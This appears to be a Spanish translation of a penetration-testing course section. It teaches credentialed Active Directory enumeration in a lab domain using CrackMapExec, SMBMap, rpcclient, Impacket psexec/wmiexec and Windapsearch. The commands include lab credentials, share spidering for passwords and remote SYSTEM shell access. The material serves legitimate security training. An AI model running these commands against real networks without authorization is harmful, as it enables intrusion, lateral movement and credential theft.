Ahora que hemos adquirido una base en el dominio, es hora de profundizar usando nuestras credenciales de usuario de dominio de bajo privilegio. Ya que tenemos una idea general sobre la base de usuarios y máquinas del dominio, es momento de enumerar el dominio en profundidad. Nos interesa obtener información sobre atributos de usuarios y computadoras del dominio, membresía de grupos, Group Policy Objects, permisos, ACLs, trusts, y más. Tenemos varias opciones disponibles, pero lo más importante es recordar que la mayoría de estas herramientas no funcionarán sin credenciales de usuario de dominio válidas en cualquier nivel de permiso. Por lo tanto, como mínimo, tendremos que haber obtenido la contraseña en texto claro de un usuario, el hash de la contraseña NTLM, o acceso SYSTEM en un host unido al dominio.

Para seguir, inicia el objetivo al final de esta sección y conecta por SSH al host de ataque Linux como el usuario `htb-student`. Para la enumeración del dominio INLANEFREIGHT.LOCAL usando las herramientas instaladas en el host Parrot Linux ATTACK01, utilizaremos las siguientes credenciales: User=`forend` y password=`Klmcargo2`. Una vez establecido nuestro acceso, es hora de empezar a trabajar. Comenzaremos con `CrackMapExec`.

---

## CrackMapExec

[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) (CME) es un conjunto de herramientas poderoso para ayudar a evaluar entornos de Active Directory. Utiliza paquetes de las toolkits Impacket y PowerSploit para realizar sus funciones. Para explicaciones detalladas sobre el uso de la herramienta y los módulos acompañantes, consulta el [wiki](https://github.com/byt3bl33d3r/CrackMapExec/wiki). No dudes en usar la flag `-h` para revisar las opciones disponibles y la sintaxis.

### CME Help Menu

```r
crackmapexec -h

usage: crackmapexec [-h] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--darrell]
                    [--verbose]
                    {mssql,smb,ssh,winrm} ...

      ______ .______           ___        ______  __  ___ .___  ___.      ___      .______    _______ ___   ___  _______   ______
     /      ||   _  \         /   \      /      ||  |/  / |   \/   |     /   \     |   _  \  |   ____|\  \ /  / |   ____| /      |
    |  ,----'|  |_)  |       /  ^  \    |  ,----'|  '  /  |  \  /  |    /  ^  \    |  |_)  | |  |__    \  V  /  |  |__   |  ,----'
    |  |     |      /       /  /_\  \   |  |     |    <   |  |\/|  |   /  /_\  \   |   ___/  |   __|    >   <   |   __|  |  |
    |  `----.|  |\  \----. /  _____  \  |  `----.|  .  \  |  |  |  |  /  _____  \  |  |      |  |____  /  .  \  |  |____ |  `----.
     \______|| _| `._____|/__/     \__\  \______||__|\__\ |__|  |__| /__/     \__\ | _|      |_______|/__/ \__\ |_______| \______|

                                         A swiss army knife for pentesting networks
                                    Forged by @byt3bl33d3r using the powah of dank memes

                                                      Version: 5.0.2dev
                                                     Codename: P3l1as
optional arguments:
  -h, --help            show this help message and exit
  -t THREADS            set how many concurrent threads to use (default: 100)
  --timeout TIMEOUT     max timeout in seconds of each thread (default: None)
  --jitter INTERVAL     sets a random delay between each connection (default: None)
  --darrell             give Darrell a hand
  --verbose             enable verbose output

protocols:
  available protocols

  {mssql,smb,ssh,winrm}
    mssql               own stuff using MSSQL
    smb                 own stuff using SMB
    ssh                 own stuff using SSH
    winrm               own stuff using WINRM

Ya feelin' a bit buggy all of a sudden?
```

Podemos ver que podemos usar la herramienta con credenciales MSSQL, SMB, SSH y WinRM. Veamos nuestras opciones para CME con el protocolo SMB:

### CME Options (SMB)

```r
crackmapexec smb -h

usage: crackmapexec smb [-h] [-id CRED_ID [CRED_ID ...]] [-u USERNAME [USERNAME ...]] [-p PASSWORD [PASSWORD ...]] [-k]
                        [--aesKey AESKEY [AESKEY ...]] [--kdcHost KDCHOST]
                        [--gfail-limit LIMIT | --ufail-limit LIMIT | --fail-limit LIMIT] [-M MODULE]
                        [-o MODULE_OPTION [MODULE_OPTION ...]] [-L] [--options] [--server {https,http}] [--server-host HOST]
                        [--server-port PORT] [-H HASH [HASH ...]] [--no-bruteforce] [-d DOMAIN | --local-auth] [--port {139,445}]
                        [--share SHARE] [--smb-server-port SMB_SERVER_PORT] [--gen-relay-list OUTPUT_FILE] [--continue-on-success]
                        [--sam | --lsa | --ntds [{drsuapi,vss}]] [--shares] [--sessions] [--disks] [--loggedon-users] [--users [USER]]
                        [--groups [GROUP]] [--local-groups [GROUP]] [--pass-pol] [--rid-brute [MAX_RID]] [--wmi QUERY]
                        [--wmi-namespace NAMESPACE] [--spider SHARE] [--spider-folder FOLDER] [--content] [--exclude-dirs DIR_LIST]
                        [--pattern PATTERN [PATTERN ...] | --regex REGEX [REGEX ...]] [--depth DEPTH] [--only-files]
                        [--put-file FILE FILE] [--get-file FILE FILE] [--exec-method {atexec,smbexec,wmiexec,mmcexec}] [--force-ps32]
                        [--no-output] [-x COMMAND | -X PS_COMMAND] [--obfs] [--amsi-bypass FILE] [--clear-obfscripts]
                        [target ...]

positional arguments:
  target                the target IP(s), range(s), CIDR(s), hostname(s), FQDN(s), file(s) containing a list of targets, NMap XML or
                        .Nessus file(s)

optional arguments:
  -h, --help            show this help message and exit
  -id CRED_ID [CRED_ID ...]
                        database credential ID(s) to use for authentication
  -u USERNAME [USERNAME ...]
                        username(s) or file(s) containing usernames
  -p PASSWORD [PASSWORD ...]
                        password(s) or file(s) containing passwords
  -k, --kerberos        Use Kerberos authentication from ccache file (KRB5CCNAME)
  
<SNIP>  
```

CME ofrece un menú de ayuda para cada protocolo (es decir, `crackmapexec winrm -h`, etc.). Asegúrate de revisar todo el menú de ayuda y todas las opciones posibles. Por ahora, las flags que nos interesan son:

- -u Username `El usuario cuyas credenciales usaremos para autenticar`
- -p Password `Contraseña del usuario`
- Target (IP o FQDN) `Host objetivo para enumerar` (en nuestro caso, el Domain Controller)
- --users `Especifica enumerar Usuarios del Dominio`
- --groups `Especifica enumerar grupos del dominio`
- --loggedon-users `Intenta enumerar qué usuarios están conectados en un objetivo, si los hay`

Comenzaremos usando el protocolo SMB para enumerar usuarios y grupos. Apuntaremos al Domain Controller (cuya dirección descubrimos antes) porque contiene todos los datos en la base de datos del dominio que nos interesa. Asegúrate de anteponer todos los comandos con `sudo`.

### CME - Domain User Enumeration

Comenzamos apuntando CME al Domain Controller y usando las credenciales para el usuario `forend` para obtener una lista de todos los usuarios del dominio. Nota que cuando nos proporciona la información del usuario, incluye puntos de datos como el atributo [badPwdCount](https://docs.microsoft.com/en-us/windows/win32/adschema/a-badpwdcount). Esto es útil al realizar acciones como targeted password spraying. Podríamos construir una lista de usuarios objetivo filtrando cualquier usuario con su atributo `badPwdCount` por encima de 0 para ser extra cuidadosos de no bloquear ninguna cuenta.

```r
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain user(s)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\administrator                  badpwdcount: 0 baddpwdtime: 2022-03-29 12:29:14.476567
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\lab_adm                        badpwdcount: 0 baddpwdtime: 2022-04-09 23:04:58.611828
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\krbtgt                         badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\htb-student                    badpwdcount: 0 baddpwdtime: 2022-03-30 16:27:41.960920
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\avazquez                       badpwdcount: 3 baddpwdtime: 2022-02-24 18:10:01.903395

<SNIP>
```

También podemos obtener una lista completa de los grupos del dominio. Deberíamos guardar toda nuestra salida en archivos para acceder fácilmente a ella más tarde para informes o uso con otras herramientas.

### CME - Domain Group Enumeration

```r
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain group(s)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Administrators                           membercount: 3
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Users                                    membercount: 4
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Guests                                   membercount: 2
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Print Operators                          membercount: 0
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Backup Operators                         membercount: 1
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Replicator                               membercount: 0

<SNIP>

SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Admins                            membercount: 19
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Users                             membercount: 0

<SNIP>

SMB         172.16.5.5      445    ACADEMY-EA-DC01  Contractors                              membercount: 138
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Accounting                               membercount: 15
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Engineering                              membercount: 19
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Executives                               membercount: 10
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Human Resources                          membercount: 36

<SNIP>
```

El fragmento anterior lista los grupos dentro del dominio y el número de usuarios en cada uno. La salida también muestra los grupos incorporados en el Domain Controller, como `Backup Operators`. Podemos comenzar a anotar grupos de interés. Toma nota de grupos clave como `Administrators`, `Domain Admins`, `Executives`, cualquier grupo que pueda contener administradores de IT con privilegios, etc. Estos grupos probablemente contendrán usuarios con privilegios elevados que valen la pena durante nuestra evaluación.

### CME - Logged On Users

También podemos usar CME para apuntar a otros hosts. Revisemos lo que parece ser un servidor de archivos para ver qué usuarios están conectados actualmente.

```r
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users

SMB         172.16.5.130    445    ACADEMY-EA-FILE  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-FILE) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.5.130    445    ACADEMY-EA-FILE  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 (Pwn3d!)
SMB         172.16.5.130    445    ACADEMY-EA-FILE  [+] Enumerated loggedon users
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\clusteragent              logon_server: ACADEMY-EA-DC01
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\lab_adm                   logon_server: ACADEMY-EA-DC01
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\svc_qualys                logon_server: ACADEMY-EA-DC01
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\wley                      logon_server: ACADEMY-EA-DC01

<SNIP>
```

Vemos que muchos usuarios están conectados a este servidor, lo cual es muy interesante. También podemos ver que nuestro usuario `forend` es un administrador local porque `(Pwn3d!)` aparece después de que la herramienta se autentica exitosamente en el host objetivo. Un host como este podría ser usado como un jump host o similar por usuarios administrativos. Podemos ver que el usuario `svc_qualys` está conectado, a quien identificamos anteriormente como un administrador del dominio. Podría ser una victoria fácil si podemos robar las credenciales de este usuario de la memoria o suplantarlo.

Como veremos más adelante, `BloodHound` (y otras herramientas como `PowerView`) pueden usarse para cazar sesiones de usuario. BloodHound es particularmente poderoso ya que podemos usarlo para ver sesiones de Usuarios del Dominio gráficamente y rápidamente de muchas maneras. De todos modos, herramientas como CME son excelentes para una enumeración y caza de usuarios más específicas.

### CME Share Searching

Podemos usar la flag `--shares` para enumerar los shares disponibles en el host remoto y el nivel de acceso que nuestra cuenta de usuario tiene para cada share (acceso READ o WRITE). Ejecutemos esto contra el Domain Controller de INLANEFREIGHT.LOCAL.

### Share Enumeration - Domain Controller

```r
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated shares
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Share           Permissions     Remark
SMB         172.16.5.5      445    ACADEMY-EA-DC01  -----           -----------     ------
SMB         172.16.5.5      445    ACADEMY-EA-DC01  ADMIN$                          Remote Admin
SMB         172.16.5.5      445    ACADEMY-EA-DC01  C$                              Default share
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Department Shares READ            
SMB         172.16.5.5      445    ACADEMY-EA-DC01  IPC$            READ            Remote IPC
SMB         172.16.5.5      445    ACADEMY-EA-DC01  NETLOGON        READ            Logon server share 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  SYSVOL          READ            Logon server share 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  User Shares     READ            
SMB         172.16.5.5      445    ACADEMY-EA-DC01  ZZZ_archive     READ 
```

Vemos varios shares disponibles para nosotros con acceso `READ`. Los shares `Department Shares`, `User Shares` y `ZZZ_archive` valdría la pena investigarlos más a fondo ya que pueden contener datos sensibles como contraseñas o PII. A continuación, podemos profundizar en los shares y rastrear cada directorio buscando archivos. El módulo `spider_plus` rastreará cada share legible en el host y listará todos los archivos legibles. Vamos a probarlo.

### Spider_plus

```r
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Started spidering plus with option:
SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]        DIR: ['print$']
SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]        EXT: ['ico', 'lnk']
SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]       SIZE: 51200
SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]     OUTPUT: /tmp/cme_spider_plus
```

En el comando anterior, ejecutamos el spider contra los `Department Shares`. Al completarse, CME escribe los resultados en un archivo JSON ubicado en `/tmp/cme_spider_plus/<ip del host>`. A continuación podemos ver una parte de la salida JSON. Podríamos buscar archivos interesantes como archivos `web.config` o scripts que pueden contener contraseñas. Si quisiéramos profundizar más, podríamos extraer esos archivos para ver qué contienen, quizás encontrando algunas credenciales hardcoded u otra información sensible.

```r
head -n 10 /tmp/cme_spider_plus/172.16.5.5.json 

{
    "Department Shares": {
        "Accounting/Private/AddSelect.bat": {
            "atime_epoch": "2022-03-31 14:44:42",
            "ctime_epoch": "2022-03-31 14:44:39",
            "mtime_epoch": "2022-03-31 15:14:46",
            "size": "278 Bytes"
        },
        "Accounting/Private/ApproveConnect.wmf": {
            "atime_epoch": "2022-03-31 14:45:14",
     
<SNIP>
```

CME es poderoso, y esto es solo una pequeña muestra de sus capacidades; vale la pena experimentarlo más contra los objetivos del laboratorio. Utilizaremos CME de varias maneras mientras avanzamos a lo largo del resto de este módulo. Pasemos a revisar `SMBMap`.

---

## SMBMap

SMBMap es excelente para enumerar shares SMB desde un host de ataque Linux. Puede usarse para recopilar una lista de shares, permisos y contenidos de shares si son accesibles. Una vez obtenido el acceso, puede usarse para descargar y subir archivos y ejecutar comandos remotos.

Al igual que CME, podemos usar SMBMap y un conjunto de credenciales de usuario de dominio para verificar shares accesibles en sistemas remotos. Como con otras herramientas, podemos escribir el comando `smbmap` `-h` para ver el menú de uso de la herramienta. Además de listar shares, podemos usar SMBMap para listar directorios recursivamente, listar el contenido de un directorio, buscar contenido de archivos y más. Esto puede ser especialmente útil al saquear shares en busca de información útil.

### SMBMap To Check Access

```r
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5

[+] IP: 172.16.5.5:445	Name: inlanefreight.local                               
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	Department Shares                                 	READ ONLY	
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
	User Shares                                       	READ ONLY	
	ZZZ_archive                                       	READ ONLY
```

Lo anterior nos dirá a qué puede acceder nuestro usuario y sus niveles de permiso. Al igual que nuestros resultados de CME, vemos que el usuario `forend` no tiene acceso al DC a través de los shares `ADMIN$` o `C$` (esto es lo esperado para una cuenta de usuario estándar), pero tiene acceso de lectura sobre `IPC$`, `NETLOGON` y `SYSVOL`, que es lo predeterminado en cualquier dominio. Los otros shares no estándar, como `Department Shares` y los shares de usuario y archivo, son los más interesantes. Hagamos una lista recursiva de los directorios en el share `Department Shares`. Podemos ver, como se esperaba, subdirectorios para cada departamento en la empresa.

### Recursive List Of All Directories

```r
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only

[+] IP: 172.16.5.5:445	Name: inlanefreight.local                               
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Department Shares                                 	READ ONLY	
	.\Department Shares\*
	dr--r--r--                0 Thu Mar 31 15:34:29 2022	.
	dr--r--r--                0 Thu Mar 31 15:34:29 2022	..
	dr--r--r--                0 Thu Mar 31 15:14:48 2022	Accounting
	dr--r--r--                0 Thu Mar 31 15:14:39 2022	Executives
	dr--r--r--                0 Thu Mar 31 15:14:57 2022	Finance
	dr--r--r--                0 Thu Mar 31 15:15:04 2022	HR
	dr--r--r--                0 Thu Mar 31 15:15:21 2022	IT
	dr--r--r--                0 Thu Mar 31 15:15:29 2022	Legal
	dr--r--r--                0 Thu Mar 31 15:15:37 2022	Marketing
	dr--r--r--                0 Thu Mar 31 15:15:47 2022	Operations
	dr--r--r--                0 Thu Mar 31 15:15:58 2022	R&D
	dr--r--r--                0 Thu Mar 31 15:16:10 2022	Temp
	dr--r--r--                0 Thu Mar 31 15:16:18 2022	Warehouse

    <SNIP>
```

A medida que la lista recursiva se adentra más, mostrará la salida de todos los subdirectorios dentro de los directorios de nivel superior. El uso de `--dir-only` proporcionó solo la salida de todos los directorios y no listó todos los archivos. Prueba esto contra otros shares en el Domain Controller y ve qué puedes encontrar.

Ahora que hemos cubierto shares, veamos `RPCClient`.

---

## rpcclient

[rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) es una herramienta útil creada para usar con el protocolo Samba y para proporcionar funcional

idad adicional a través de MS-RPC. Puede enumerar, agregar, cambiar e incluso eliminar objetos de AD. Es muy versátil; solo tenemos que encontrar el comando correcto para emitir lo que queremos lograr. La página del manual de rpcclient es muy útil para esto; solo escribe `man rpcclient` en el shell de tu host de ataque y revisa las opciones disponibles. Cubramos algunas funciones de rpcclient que pueden ser útiles durante una prueba de penetración.

Debido a las sesiones NULL de SMB (cubiertas en profundidad en las secciones de password spraying) en algunos de nuestros hosts, podemos realizar enumeración autenticada o no autenticada usando rpcclient en el dominio INLANEFREIGHT.LOCAL. Un ejemplo de usar rpcclient desde un punto de vista no autenticado (si esta configuración existe en nuestro dominio objetivo) sería:

```r
rpcclient -U "" -N 172.16.5.5
```

Lo anterior nos proporcionará una conexión vinculada, y deberíamos ser recibidos con un nuevo prompt para comenzar a desatar el poder de rpcclient.

### SMB NULL Session with rpcclient

![image](https://academy.hackthebox.com/storage/modules/143/rpcclient.png)

Desde aquí, podemos comenzar a enumerar cualquier cantidad de cosas diferentes. Comencemos con usuarios del dominio.

### rpcclient Enumeration

Al mirar usuarios en rpcclient, puede que notes un campo llamado `rid:` al lado de cada usuario. Un [Relative Identifier (RID)](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers) es un identificador único (representado en formato hexadecimal) utilizado por Windows para rastrear e identificar objetos. Para explicar cómo encaja esto, veamos los ejemplos a continuación:

- El [SID](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers) para el dominio INLANEFREIGHT.LOCAL es: `S-1-5-21-3842939050-3880317879-2865463114`.
- Cuando se crea un objeto dentro de un dominio, el número anterior (SID) se combinará con un RID para hacer un valor único usado para representar el objeto.
- Entonces, el usuario de dominio `htb-student` con un RID:[0x457] Hex 0x457 sería = decimal `1111`, tendrá un SID de usuario completo de: `S-1-5-21-3842939050-3880317879-2865463114-1111`.
- Esto es único para el objeto `htb-student` en el dominio INLANEFREIGHT.LOCAL y nunca verás este valor emparejado atado a otro objeto en este dominio o en cualquier otro.

Sin embargo, hay cuentas que notarás que tienen el mismo RID independientemente de en qué host estés. Cuentas como el Administrador incorporado para un dominio tendrán un RID [administrator] rid:[0x1f4], que, cuando se convierte a un valor decimal, es igual a `500`. La cuenta de Administrador incorporado siempre tendrá el valor RID `Hex 0x1f4`, o 500. Esto siempre será así. Dado que este valor es único para un objeto, podemos usarlo para enumerar más información sobre él desde el dominio. Vamos a intentarlo nuevamente con rpcclient. Excavaremos un poco apuntando al usuario `htb-student`.

### RPCClient User Enumeration By RID

```r
rpcclient $> queryuser 0x457

        User Name   :   htb-student
        Full Name   :   Htb Student
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Wed, 02 Mar 2022 15:34:32 EST
        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST
        Kickoff Time             :      Wed, 13 Sep 30828 22:48:05 EDT
        Password last set Time   :      Wed, 27 Oct 2021 12:26:52 EDT
        Password can change Time :      Thu, 28 Oct 2021 12:26:52 EDT
        Password must change Time:      Wed, 13 Sep 30828 22:48:05 EDT
        unknown_2[0..31]...
        user_rid :      0x457
        group_rid:      0x201
        acb_info :      0x00000010
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x0000001d
        padding1[0..7]...
        logon_hrs[0..21]...
```

Cuando buscamos información usando el comando `queryuser` contra el RID `0x457`, RPC devolvió la información del usuario para `htb-student` como se esperaba. Esto no fue difícil ya que ya sabíamos el RID para `htb-student`. Si deseamos enumerar todos los usuarios para obtener los RIDs de más de uno, usaríamos el comando `enumdomusers`.

### Enumdomusers

```r
rpcclient $> enumdomusers

user:[administrator] rid:[0x1f4]
user:[guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[lab_adm] rid:[0x3e9]
user:[htb-student] rid:[0x457]
user:[avazquez] rid:[0x458]
user:[pfalcon] rid:[0x459]
user:[fanthony] rid:[0x45a]
user:[wdillard] rid:[0x45b]
user:[lbradford] rid:[0x45c]
user:[sgage] rid:[0x45d]
user:[asanchez] rid:[0x45e]
user:[dbranch] rid:[0x45f]
user:[ccruz] rid:[0x460]
user:[njohnson] rid:[0x461]
user:[mholliday] rid:[0x462]

<SNIP>  
```

Usándolo de esta manera imprimirá todos los usuarios del dominio por nombre y RID. Nuestra enumeración puede entrar en gran detalle utilizando rpcclient. Incluso podríamos comenzar a realizar acciones como editar usuarios y grupos o agregar los nuestros al dominio, pero esto está fuera del alcance de este módulo. Por ahora, solo queremos realizar la enumeración del dominio para validar nuestros hallazgos. Tómate un tiempo para jugar con las otras funciones de rpcclient y ver los resultados que producen. Para más información sobre temas como SIDs, RIDs y otros componentes centrales de AD, valdría la pena revisar el módulo [Introduction to Active Directory](https://academy.hackthebox.com/course/preview/introduction-to-active-directory). Ahora, es momento de sumergirse en Impacket en todo su esplendor.

---

## Impacket Toolkit

Impacket es un conjunto de herramientas versátil que nos proporciona muchas maneras diferentes de enumerar, interactuar y explotar protocolos de Windows y encontrar la información que necesitamos usando Python. La herramienta es mantenida activamente y tiene muchos contribuyentes, especialmente cuando surgen nuevas técnicas de ataque. Podríamos realizar muchas otras acciones con Impacket, pero solo destacaremos algunas en esta sección; [wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py) y [psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py). Anteriormente en la sección de envenenamiento, obtuvimos un hash para el usuario `wley` con `Responder` y lo crackeamos para obtener la contraseña `transporter@4`. Veremos en la siguiente sección que este usuario es un administrador local en el host `ACADEMY-EA-FILE`. Utilizaremos las credenciales para las próximas acciones.

### Psexec.py

Una de las herramientas más útiles en el conjunto de Impacket es `psexec.py`. Psexec.py es un clon del ejecutable psexec de Sysinternals, pero funciona de manera ligeramente diferente a la original. La herramienta crea un servicio remoto subiendo un ejecutable con nombre aleatorio al share `ADMIN$` en el host objetivo. Luego registra el servicio a través de `RPC` y el `Windows Service Control Manager`. Una vez establecido, la comunicación sucede a través de una named pipe, proporcionando un shell remoto interactivo como `SYSTEM` en el host víctima.

### Using psexec.py

Para conectarse a un host con psexec.py, necesitamos credenciales para un usuario con privilegios de administrador local.

```r
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125  
```

![image](https://academy.hackthebox.com/storage/modules/143/psexec-action.png)

Una vez que ejecutamos el módulo psexec, nos lleva al directorio `system32` en el host objetivo. Ejecutamos el comando `whoami` para verificar, y confirmó que aterrizamos en el host como `SYSTEM`. Desde aquí, podemos realizar casi cualquier tarea en este host; cualquier cosa desde más enumeración hasta persistencia y movimiento lateral. Probemos otro módulo de Impacket: `wmiexec.py`.

### wmiexec.py

Wmiexec.py utiliza un shell semi-interactivo donde los comandos se ejecutan a través de [Windows Management Instrumentation](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page). No deja caer ningún archivo o ejecutable en el host objetivo y genera menos registros que otros módulos. Después de conectarse, se ejecuta como el usuario admin local con el que nos conectamos (esto puede ser menos obvio para alguien que busca una intrusión que ver SYSTEM ejecutando muchos comandos). Este es un enfoque más sigiloso para la ejecución en hosts que otras herramientas, pero aún así probablemente sería detectado por la mayoría de los sistemas modernos de antivirus y EDR. Usaremos la misma cuenta que con psexec.py para acceder al host.

### Using wmiexec.py

```r
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  
```

![text](https://academy.hackthebox.com/storage/modules/143/wmiexec-action.png)

Nota que este entorno de shell no es completamente interactivo, por lo que cada comando emitido ejecutará un nuevo cmd.exe desde WMI y ejecutará tu comando. La desventaja de esto es que si un defensor vigilante revisa los registros de eventos y observa el ID de evento [4688: A new process has been created](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688), verá un nuevo proceso creado para iniciar cmd.exe y emitir un comando. Esto no siempre es una actividad maliciosa, ya que muchas organizaciones utilizan WMI para administrar computadoras, pero puede ser una pista en una investigación. En la imagen anterior, también es evidente que el proceso se está ejecutando bajo el contexto del usuario `wley` en el host, no como SYSTEM. Impacket es una herramienta inmensamente valiosa que tiene muchos casos de uso. Veremos muchas otras herramientas en el conjunto de Impacket a lo largo del resto de este módulo. Como pentester que trabaja con hosts de Windows, esta herramienta siempre debe estar en nuestro arsenal. Pasemos a la siguiente herramienta, `Windapsearch`.

---

## Windapsearch

[Windapsearch](https://github.com/ropnop/windapsearch) es otro script de Python útil que podemos usar para enumerar usuarios, grupos y computadoras desde un dominio de Windows utilizando consultas LDAP. Está presente en el directorio /opt/windapsearch/ de nuestro host de ataque.

### Windapsearch Help

```r
windapsearch.py -h

usage: windapsearch.py [-h] [-d DOMAIN] [--dc-ip DC_IP] [-u USER]
                       [-p PASSWORD] [--functionality] [-G] [-U] [-C]
                       [-m GROUP_NAME] [--da] [--admin-objects] [--user-spns]
                       [--unconstrained-users] [--unconstrained-computers]
                       [--gpos] [-s SEARCH_TERM] [-l DN]
                       [--custom CUSTOM_FILTER] [-r] [--attrs ATTRS] [--full]
                       [-o output_dir]

Script to perform Windows domain enumeration through LDAP queries to a Domain
Controller

optional arguments:
  -h, --help            show this help message and exit

Domain Options:
  -d DOMAIN, --domain DOMAIN
                        The FQDN of the domain (e.g. 'lab.example.com'). Only
                        needed if DC-IP not provided
  --dc-ip DC_IP         The IP address of a domain controller

Bind Options:
  Specify bind account. If not specified, anonymous bind will be attempted

  -u USER, --user USER  The full username with domain to bind with (e.g.
                        'ropnop@lab.example.com' or 'LAB\ropnop'
  -p PASSWORD, --password PASSWORD
                        Password to use. If not specified, will be prompted
                        for

Enumeration Options:
  Data to enumerate from LDAP

  --functionality       Enumerate Domain Functionality level. Possible through
                        anonymous bind
  -G, --groups          Enumerate all AD Groups
  -U, --users           Enumerate all AD Users
  -PU, --privileged-users
                        Enumerate All privileged AD Users. Performs recursive
                        lookups for nested members.
  -C, --computers       Enumerate all AD Computers

  <SNIP>
```

Tenemos varias opciones con Windapsearch para realizar una enumeración estándar (descargando usuarios, computadoras y grupos) y una enumeración más detallada. Las opciones `--da` (enumerar miembros del grupo de administradores de dominio) y `-PU` (encontrar usuarios privilegiados

) son interesantes. La opción `-PU` es interesante porque realizará una búsqueda recursiva de usuarios con membresía de grupo anidada.

### Windapsearch - Domain Admins

```r
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da

